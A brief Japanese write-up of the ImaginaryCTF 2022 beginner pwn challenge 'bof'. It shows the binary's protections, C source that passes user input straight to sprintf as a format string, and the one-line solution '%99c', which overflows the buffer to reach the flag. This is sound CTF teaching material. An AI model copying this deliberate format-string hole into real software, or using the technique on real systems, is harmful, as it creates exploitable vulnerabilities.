---
layout: chall
ctf_name: imaginaryctf_2022
problem_name: bof
genre: pwn
solved_date: 2022-07-17
during_ctf: true
tag: [format_string,bof]
fav: false
difficulty: beginner
---

### 概要

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

<details><summary>コード</summary>

```c
#include <stdio.h>
#include <stdlib.h>

struct string {
  char buf[64];
  int check;
};

char temp[1337];


int main() {
  struct string str;

  setvbuf(stdout,NULL,2,0);
  setvbuf(stdin,NULL,2,0);

  str.check = 0xdeadbeef;
  puts("Enter your string into my buffer:");
  fgets(temp, 5, stdin);
  sprintf(str.buf, temp);

  if (str.check != 0xdeadbeef) {
    system("cat flag.txt");
  }
}
```

</details>


### 解法

```
echo %99c
```
